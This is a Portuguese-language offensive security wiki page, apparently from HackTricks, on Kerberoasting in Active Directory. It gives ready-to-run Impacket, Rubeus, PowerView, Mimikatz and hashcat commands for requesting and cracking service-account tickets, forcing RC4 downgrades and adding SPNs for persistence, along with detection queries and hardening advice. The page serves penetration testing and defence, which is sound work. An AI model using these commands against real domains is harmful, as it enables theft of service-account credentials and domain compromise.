# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting foca na aquisição de tickets TGS, especificamente aqueles relacionados a serviços operando sob contas de usuário no Active Directory (AD), excluindo contas de computador. A criptografia desses tickets utiliza chaves que se originam das senhas dos usuários, permitindo a quebra de credenciais offline. O uso de uma conta de usuário como serviço é indicado por uma propriedade ServicePrincipalName (SPN) não vazia.

Qualquer usuário autenticado do domínio pode solicitar tickets TGS, portanto, não são necessárias permissões especiais.

### Pontos Chave

- Alvo são tickets TGS para serviços que rodam sob contas de usuário (ou seja, contas com SPN definido; não contas de computador).
- Os tickets são criptografados com uma chave derivada da senha da conta de serviço e podem ser quebrados offline.
- Nenhuma permissão elevada é necessária; qualquer conta autenticada pode solicitar tickets TGS.

> [!WARNING]
> A maioria das ferramentas públicas prefere solicitar tickets de serviço RC4-HMAC (tipo 23) porque são mais rápidos de quebrar do que AES. Hashes TGS RC4 começam com `$krb5tgs$23$*`, AES128 com `$krb5tgs$17$*`, e AES256 com `$krb5tgs$18$*`. No entanto, muitos ambientes estão migrando para apenas AES. Não assuma que apenas RC4 é relevante.
> Além disso, evite o "spray-and-pray" na técnica de roasting. O kerberoast padrão do Rubeus pode consultar e solicitar tickets para todos os SPNs e é barulhento. Enumere e direcione os princípios interessantes primeiro.

### Ataque

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Ferramentas multifuncionais, incluindo verificações de kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Enumerar usuários kerberoastable
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Técnica 1: Solicitar TGS e despejar da memória
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Técnica 2: Ferramentas automáticas
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Um pedido de TGS gera o Evento de Segurança do Windows 4769 (Um ticket de serviço Kerberos foi solicitado).

### OPSEC e ambientes apenas com AES

- Solicite RC4 de propósito para contas sem AES:
- Rubeus: `/rc4opsec` usa tgtdeleg para enumerar contas sem AES e solicita tickets de serviço RC4.
- Rubeus: `/tgtdeleg` com kerberoast também aciona solicitações RC4 onde possível.
- Torre contas apenas com AES em vez de falhar silenciosamente:
- Rubeus: `/aes` enumera contas com AES habilitado e solicita tickets de serviço AES (tipo 17/18).
- Se você já possui um TGT (PTT ou de um .kirbi), pode usar `/ticket:<blob|path>` com `/spn:<SPN>` ou `/spns:<file>` e pular o LDAP.
- Direcionamento, limitação e menos ruído:
- Use `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` e `/jitter:<1-100>`.
- Filtre por senhas provavelmente fracas usando `/pwdsetbefore:<MM-dd-yyyy>` (senhas mais antigas) ou direcione OUs privilegiadas com `/ou:<DN>`.

Exemplos (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Quebra
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistência / Abuso

Se você controla ou pode modificar uma conta, pode torná-la kerberoastable adicionando um SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Rebaixar uma conta para habilitar RC4 para facilitar a quebra (requer privilégios de escrita no objeto alvo):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
Você pode encontrar ferramentas úteis para ataques de kerberoast aqui: https://github.com/nidem/kerberoast

Se você encontrar este erro do Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` é devido ao desvio de hora local. Sincronize com o DC:

- `ntpdate <DC_IP>` (obsoleto em algumas distribuições)
- `rdate -n <DC_IP>`

### Detecção

Kerberoasting pode ser furtivo. Procure pelo ID de Evento 4769 dos DCs e aplique filtros para reduzir o ruído:

- Exclua o nome do serviço `krbtgt` e nomes de serviços que terminam com `$` (contas de computador).
- Exclua solicitações de contas de máquina (`*$$@*`).
- Apenas solicitações bem-sucedidas (Código de Falha `0x0`).
- Acompanhe os tipos de criptografia: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Não alerte apenas sobre `0x17`.

Exemplo de triagem PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Ideias adicionais:

- Estabeleça um uso normal de SPN por host/usuário; alerta sobre grandes picos de solicitações distintas de SPN de um único principal.
- Marque o uso incomum de RC4 em domínios com AES endurecido.

### Mitigação / Endurecimento

- Use gMSA/dMSA ou contas de máquina para serviços. Contas gerenciadas têm senhas aleatórias de mais de 120 caracteres e giram automaticamente, tornando a quebra offline impraticável.
- Aplique AES em contas de serviço definindo `msDS-SupportedEncryptionTypes` para apenas AES (decimal 24 / hex 0x18) e, em seguida, gire a senha para que as chaves AES sejam derivadas.
- Sempre que possível, desative o RC4 em seu ambiente e monitore tentativas de uso de RC4. Em DCs, você pode usar o valor de registro `DefaultDomainSupportedEncTypes` para direcionar padrões para contas sem `msDS-SupportedEncryptionTypes` definido. Teste minuciosamente.
- Remova SPNs desnecessários de contas de usuário.
- Use senhas longas e aleatórias para contas de serviço (25+ caracteres) se contas gerenciadas não forem viáveis; proíba senhas comuns e audite regularmente.

### Kerberoast sem uma conta de domínio (STs solicitados por AS)

Em setembro de 2022, Charlie Clark mostrou que se um principal não requer pré-autenticação, é possível obter um ticket de serviço via um KRB_AS_REQ elaborado alterando o sname no corpo da solicitação, efetivamente obtendo um ticket de serviço em vez de um TGT. Isso espelha o AS-REP roasting e não requer credenciais de domínio válidas.

Veja os detalhes: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Você deve fornecer uma lista de usuários porque, sem credenciais válidas, não é possível consultar o LDAP com esta técnica.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Relacionado

Se você está visando usuários que podem ser alvo de AS-REP roastable, veja também:

{{#ref}}
asreproast.md
{{#endref}}

## Referências

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- Microsoft Security Blog (2024-10-11) – Orientações da Microsoft para ajudar a mitigar o Kerberoasting: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
- SpecterOps – Documentação do Rubeus Roasting: https://docs.specterops.io/ghostpack/rubeus/roasting

{{#include ../../banners/hacktricks-training.md}}
